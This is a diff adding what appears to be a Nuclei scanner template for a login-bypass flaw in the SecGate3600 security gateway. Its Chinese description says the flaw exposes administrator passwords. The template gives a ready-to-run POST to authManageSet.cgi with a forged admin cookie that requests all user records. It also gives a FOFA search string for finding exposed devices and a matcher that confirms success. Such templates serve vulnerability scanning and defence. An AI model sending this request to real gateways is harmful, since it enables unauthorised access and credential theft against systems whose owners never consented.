@@ -1,0 +1,31 @@
+id: secgate3600-iot-authmanageset-cgi-unauth
+
+info:
+  name: 网神 SecGate3600 authManageSet.cgi 接口登录绕过漏洞
+  author: m0be1
+  severity: high
+  description: SecGate3600是网神信息技术(北京)股份有限公司旗下一款安全网关产品，网神 SecGate3600 存在登录绕过漏洞，攻击者利用该漏洞可获取管理员密码等敏感信息，进一步控制系统。
+
+  reference:
+    - https://
+  metadata: 
+    fofa-query: body="sec_gate_image/login_02.gif"
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: sw_login_name=admin
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body,"<?xml")
